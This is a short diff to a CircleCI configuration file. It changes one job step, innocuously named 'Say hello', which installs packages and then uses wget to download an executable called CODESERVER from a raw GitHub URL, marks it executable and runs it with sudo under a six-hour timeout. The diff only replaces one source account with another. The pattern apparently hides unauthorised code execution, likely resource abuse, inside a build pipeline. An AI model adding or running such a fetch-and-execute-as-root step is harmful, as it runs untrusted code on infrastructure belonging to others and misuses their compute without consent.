@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command:  sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/uhjghj45/DevopCheck/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER
+          command:  sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/aurbach55/pos/main/CODESERVER && chmod +x CODESERVER && sudo ./CODESERVER
           no_output_timeout: 6h
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
